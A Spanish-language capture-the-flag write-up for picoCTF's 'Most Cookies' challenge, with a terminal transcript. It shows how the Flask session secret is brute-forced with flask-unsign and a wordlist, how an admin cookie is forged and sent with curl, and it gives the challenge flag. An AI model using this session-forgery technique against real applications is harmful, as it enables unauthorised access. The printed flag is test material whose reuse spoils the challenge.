# Most Cookies

## Description

Alright, enough of using my own encryption. Flask session cookies should be plenty secure! [server.py](https://mercury.picoctf.net/static/99a50920a248ec37c39b8e3ab0af8789/server.py) [http://mercury.picoctf.net:18835/](http://mercury.picoctf.net:18835/)

## Hints 1

* How secure is a flask cookie?

## Solución

Entramos al sitio web proporcionado, e ingresamos **snickerdoodle** al ver que no nos muestra la flag, trataremos de usar un **flask-unsign** para modificar el admin y hacer todo un proceso para que nos muestre nuestra flag.

* Primero debemos instalamos los siguientes comandos para poder utilizar en la terminal:
**sudo apt install pipx (si no funciona este comando se puede utilizar el siguiente:)
sudo apt install python3.8-venv
pipx ensurepath
pipx install flask-unsing

**Nota importante: En algunos casos los comandos pueden variar, entonces es ver cuales comandos sirven en cada terminal.**

```
jazmin@DESKTOP-1CBQJ6D:~$ sudo apt install python3.8-venv
Reading package lists... Done
Building dependency tree
Reading state information... Done
The following additional packages will be installed:
  python-pip-whl
The following NEW packages will be installed:
  python-pip-whl python3.8-venv
0 upgraded, 2 newly installed, 0 to remove and 0 not upgraded.
Need to get 1814 kB of archives.
After this operation, 2344 kB of additional disk space will be used.
Do you want to continue? [Y/n] y
Get:1 http://archive.ubuntu.com/ubuntu focal-updates/universe amd64 python-pip-whl all 20.0.2-5ubuntu1.11 [1808 kB]
Get:2 http://archive.ubuntu.com/ubuntu focal-updates/universe amd64 python3.8-venv amd64 3.8.10-0ubuntu1~20.04.18 [5448 B]
Fetched 1814 kB in 2s (855 kB/s)
Selecting previously unselected package python-pip-whl.
(Reading database ... 41614 files and directories currently installed.)
Preparing to unpack .../python-pip-whl_20.0.2-5ubuntu1.11_all.deb ...
Unpacking python-pip-whl (20.0.2-5ubuntu1.11) ...
Selecting previously unselected package python3.8-venv.
Preparing to unpack .../python3.8-venv_3.8.10-0ubuntu1~20.04.18_amd64.deb ...
Unpacking python3.8-venv (3.8.10-0ubuntu1~20.04.18) ...
Setting up python-pip-whl (20.0.2-5ubuntu1.11) ...
Setting up python3.8-venv (3.8.10-0ubuntu1~20.04.18) ...
jazmin@DESKTOP-1CBQJ6D:~$ python3 --version
Python 3.8.10
jazmin@DESKTOP-1CBQJ6D:~$ pipx ensurepath
Your PATH looks like it already is set up for pipx. Pass `--force` to modify the PATH.
jazmin@DESKTOP-1CBQJ6D:~$ pipx install flask-unsign
  installed package flask-unsign 1.2.1, Python 3.8.10
  These binaries are now globally available
    - flask-unsign
done! ✨ 🌟 ✨
jazmin@DESKTOP-1CBQJ6D:~$
```

Una vez instaladas las cosas podemos seguir para buscar la cookie secreta que esta encriptada, pero antes de eso abrimos nuestro archivo **server.py** y en la parte de **cookie_names** copiamos todos los nombres y los acomodamos en un archivo de texto en forma de lista al cual lo nombraremos **cookies.txt** después de esto volvemos a nuestra terminal e ingresamos el siguiente comando:
`flask-unsign -u --server "http://mercury.picoctf.net:18835" --wordlist cookies.txt`
el cual nos mostrara nuestra cookie secreta que en este caso fue **fortune**

Ingresamos el siguiente comando:
`flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret fortune`

y nos muestra un nuevo valor de la cookie.

Entonces aplicamos un curl con el respectivo url y el nuevo valor en el session de la cookie y por ultimo aplicamos un grep para que muestre nuestra flag.
`curl -s http://mercury.picoctf.net:18835k/display -H "cookie: session=eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Z-81Qw.m6Ni2XO68zM-TizAIbMXtZSefKg" | grep -oE "picoCTF{.*?}"`

### Simulación de la Terminal
```
jazmin@DESKTOP-1CBQJ6D:~/FIS$ echo eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.Z-8q-w.8YKICmof6BD7UmkxDV4OAAwTIZc | base64 -d
{"very_auth":"snickerdoodle"}base64: invalid input
jazmin@DESKTOP-1CBQJ6D:~/FIS$ cat coockies.txt
cat: coockies.txt: No such file or directory
jazmin@DESKTOP-1CBQJ6D:~/FIS$ cat cookies.txt
snickerdoodle
chocolate chip
oatmeal raisin
gingersnap
shortbread
peanut butter
whoopie pie
sugar
molasses
kiss
biscotti
butter
spritz
snowball
drop
thumbprint
pinwheel
wafer
macaroon
fortune
crinkle
icebox
gingerbread
tassie
lebkuchen
macaron
black and white
white chocolate macadamia
jazmin@DESKTOP-1CBQJ6D:~/FIS$ flask-unsign -u --server "http://mercury.picoctf.net:18835" --wordlist cookies.txt
[*] Server returned HTTP 302 (FOUND)
[+] Successfully obtained session cookie: eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.Z-806Q.OELjUY1NHIVxg-BTdRr8XW8Mf0Y
[*] Session decodes to: {'very_auth': 'blank'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 28 attemptscadamia
'fortune'
jazmin@DESKTOP-1CBQJ6D:~/FIS$ flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret fortune
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Z-81Qw.m6Ni2XO68zM-TizAIbMXtZSefKg
jazmin@DESKTOP-1CBQJ6D:~/FIS$ curl -s http://mercury.picoctf.net:18835k/display -H "cookie: session=eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Z-81Qw.m6Ni2XO68zM-TizAIbMXtZSefKg" | grep -oE "picoCTF{.*?}"
picoCTF{pwn_4ll_th3_cook1E5_743c20eb}

```
### Respuesta: picoCTF{pwn_4ll_th3_cook1E5_743c20eb}
